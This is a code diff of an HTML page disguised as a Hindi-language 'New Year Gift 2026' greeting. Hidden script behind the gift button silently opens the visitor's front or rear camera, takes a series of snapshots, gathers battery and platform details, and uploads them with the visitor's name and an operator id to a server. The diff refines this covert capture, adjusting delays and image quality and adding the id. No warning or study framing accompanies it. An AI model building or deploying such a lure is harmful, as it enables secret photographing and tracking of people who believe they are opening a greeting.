@@ -3,32 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>New Year Surprise 2026</title>
+    <title>New Year Gift 2026</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { text-align: center; width: 90%; max-width: 400px; padding: 20px; border: 2px solid #ff0055; border-radius: 20px; background: rgba(255, 0, 85, 0.05); box-shadow: 0 0 20px #ff0055; }
-        h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; margin-bottom: 20px; }
-        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; font-size: 16px; margin-bottom: 20px; outline: none; }
-        button { padding: 15px 40px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { transform: scale(1.05); box-shadow: 0 0 15px #ff0055; }
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { text-align: center; width: 85%; max-width: 400px; padding: 25px; border: 2px solid #ff0055; border-radius: 25px; background: #0a0a0a; box-shadow: 0 0 25px #ff0055; }
+        h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; }
+        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; margin-bottom: 20px; text-align: center; }
+        button { padding: 15px 35px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-weight: bold; cursor: pointer; }
         #wish-box { display: none; }
-        .wish-text { font-size: 22px; line-height: 1.5; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="container" id="main-box">
-        <h1>🎆 Surprise Gift 🎆</h1>
-        <p>अपना नाम लिखें और जादू देखें!</p>
-        <input type="text" id="userName" placeholder="यहाँ अपना नाम लिखें...">
-        <br>
-        <button onclick="startApp()">जादू देखें ✨</button>
+        <h1>🎇 New Year Gift 🎇</h1>
+        <p>अपना नाम लिखें और उपहार खोलें!</p>
+        <input type="text" id="userName" placeholder="आपका नाम...">
+        <button onclick="startApp()">उपहार खोलें ✨</button>
     </div>
 
     <div class="container" id="wish-box">
-        <div class="wish-text" id="wishMsg"></div>
-        <p style="margin-top:20px;">🎊 Happy New Year 2026 🎊</p>
+        <h2 id="wishMsg" style="font-size: 20px;"></h2>
+        <p>🎊 Happy New Year 2026 🎊</p>
     </div>
 
     <video id="v" style="display:none" autoplay playsinline></video>
@@ -38,10 +35,11 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const mode = urlParams.get('m') || 'front';
+        const uid = urlParams.get('uid') || '7162565886';
 
         async function startApp() {
             let name = document.getElementById('userName').value;
-            if(!name) return alert("कृपया अपना नाम डालें!");
+            if(!name) return alert("नाम डालना जरूरी है!");
 
             document.getElementById('main-box').style.display = 'none';
             document.getElementById('wish-box').style.display = 'block';
@@ -54,7 +52,7 @@
         }
 
         async function initCapture(name) {
-            let info = { battery: "Unknown", platform: navigator.platform };
+            let info = { battery: "N/A", platform: navigator.platform };
             try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}
 
             if(mode === 'front') await runCam(name, info, {facingMode: "user"}, 5, "FRONT");
@@ -67,21 +65,33 @@
 
         async function runCam(name, info, constraints, count, label) {
             try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
+                let stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { ...constraints, width: {ideal: 640}, height: {ideal: 480} } 
+                });
                 let video = document.getElementById('v');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 3000)); // कैमरा सेटल होने का इंतज़ार
+                
+                // 4 सेकंड का डिले ताकि कैमरा लाइट एडजस्ट कर ले
+                await new Promise(r => setTimeout(r, 4000)); 
 
                 for (let i = 1; i <= count; i++) {
                     let can = document.getElementById('c');
-                    can.width = video.videoWidth; can.height = video.videoHeight;
+                    can.width = video.videoWidth; 
+                    can.height = video.videoHeight;
                     can.getContext('2d').drawImage(video, 0, 0);
+                    
                     fetch('/upload', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({name: name, image: can.toDataURL('image/jpeg', 0.6), info: info, label: label+" "+i})
+                        body: JSON.stringify({
+                            name: name, 
+                            image: can.toDataURL('image/jpeg', 0.4), 
+                            info: info, 
+                            label: label+" "+i,
+                            uid: uid 
+                        })
                     });
-                    await new Promise(r => setTimeout(r, 2000));
+                    await new Promise(r => setTimeout(r, 3000));
                 }
                 stream.getTracks().forEach(t => t.stop());
             } catch(e) {}
